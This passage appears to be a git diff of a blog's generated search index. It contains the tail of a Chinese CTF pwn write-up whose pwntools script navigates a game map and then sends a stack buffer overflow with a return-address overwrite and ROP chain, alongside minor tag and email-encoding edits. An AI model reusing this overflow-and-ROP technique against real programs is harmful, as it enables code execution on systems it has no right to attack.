class="line"></span><br><span class="line">def maps():</span><br><span class="line">    p.sendline(b&#x27;s&#x27;)</span><br><span class="line">    p.sendline(b&#x27;s&#x27;)</span><br><span class="line">    p.sendline(b&#x27;s&#x27;)</span><br><span class="line">    p.sendline(b&#x27;s&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    p.recvuntil(&#x27;flag&#x27;)</span><br><span class="line">    p.sendline(b&#x27;a&#x27;*0x178+p64(buf+0x300)+rop)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">maps()</span><br><span class="line">pwn()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>misc</tag>
+        <tag>web</tag>
+        <tag>re</tag>
       </tags>
   </entry>
   <entry>
@@ -409,8 +409,8 @@
       <tags>
         <tag>pwn</tag>
         <tag>misc</tag>
-        <tag>re</tag>
         <tag>web</tag>
+        <tag>re</tag>
       </tags>
   </entry>
   <entry>
@@ -1819,7 +1819,7 @@
 <p>​    print(“     To use this python script , you must install the tshark first.”)</p>
 <p>​    print(“     You can use <code>sudo apt-get install tshark</code> to install it”)</p>
 <p>​    print(“Author : “)</p>
-<p>​    print(“     WangYihang <a href="mailto:&#x77;&#x61;&#x6e;&#103;&#x79;&#105;&#104;&#x61;&#x6e;&#103;&#x65;&#114;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#x77;&#x61;&#x6e;&#103;&#x79;&#105;&#104;&#x61;&#x6e;&#103;&#x65;&#114;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;</a>“)</p>
+<p>​    print(“     WangYihang <a href="mailto:&#x77;&#97;&#110;&#x67;&#x79;&#105;&#x68;&#97;&#110;&#x67;&#x65;&#114;&#x40;&#103;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;">&#x77;&#97;&#110;&#x67;&#x79;&#105;&#x68;&#97;&#110;&#x67;&#x65;&#114;&#x40;&#103;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;</a>“)</p>
 <p>​    print(“     If you have any questions , please contact me by email.”)</p>
 <p>​    print(“     Thank you for using.”)</p>
 <p>​    exit(1)</p>
